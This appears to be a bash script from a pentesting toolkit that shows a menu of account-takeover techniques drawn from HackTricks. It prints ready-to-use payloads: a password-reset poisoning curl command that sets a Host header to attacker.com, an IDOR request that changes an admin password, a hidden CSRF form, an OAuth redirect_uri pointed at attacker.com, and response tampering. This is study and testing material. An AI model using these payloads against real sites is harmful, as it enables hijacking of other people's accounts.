#!/bin/bash
# HackTricks Ref: account-takeover.md
# Module: Account Takeover (ATO) Prevention & Exploitation

echo -e "${C6}[WEB ATTACK: ACCOUNT_TAKEOVER]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/account-takeover"
echo -e "--------------------------------------------------"

echo -e "${C4}Select ATO Vector to Explore:${NC}"
echo "1) Password Reset Poisoning (Host Header Injection)"
echo "2) CSRF to Account Takeover (Email/Pass Change)"
echo "3) IDOR in Account Settings"
echo "4) OAUTH Misconfigurations (State/Redirect_URI)"
echo "5) Response/Status Code Manipulation"
echo "0) Exit"

read -p "Selection: " ato_opt

case $ato_opt in
    1)
        echo -e "\n${C2}[*] Password Reset Poisoning:${NC}"
        echo "Goal: Make the server send the reset link to your domain."
        echo "Try adding these headers to the Reset Request:"
        echo " - Host: attacker.com"
        echo " - X-Forwarded-Host: attacker.com"
        echo "Example: curl -H \"Host: attacker.com\" -X POST https://target.com/reset-password"
        ;;
    2)
        echo -e "\n${C2}[*] CSRF to ATO:${NC}"
        echo "Check if the 'Change Email' or 'Change Password' forms lack CSRF tokens."
        echo "Payload: A hidden form that auto-submits to /settings/update-email"
        ;;
    3)
        echo -e "\n${C2}[*] IDOR (Insecure Direct Object Reference):${NC}"
        echo "Can you change another user's password by modifying a UID?"
        echo "Request: POST /api/v1/update-password"
        echo "Body: {\"user_id\": \"1005\", \"new_password\": \"hacked\"}"
        echo "Change 1005 to 1001 (Admin)."
        ;;
    4)
        echo -e "\n${C2}[*] OAUTH Takeover:${NC}"
        echo "1. Check if 'redirect_uri' can be pointed to attacker.com."
        echo "2. Check if the 'state' parameter is missing (CSRF risk)."
        echo "3. Try to use the same Auth Code twice."
        ;;
    5)
        echo -e "\n${C2}[*] Response Manipulation:${NC}"
        echo "On a 'Verify Email' or 'Login' screen:"
        echo "Intercept response and change: {\"status\":\"error\"} -> {\"status\":\"success\"}"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
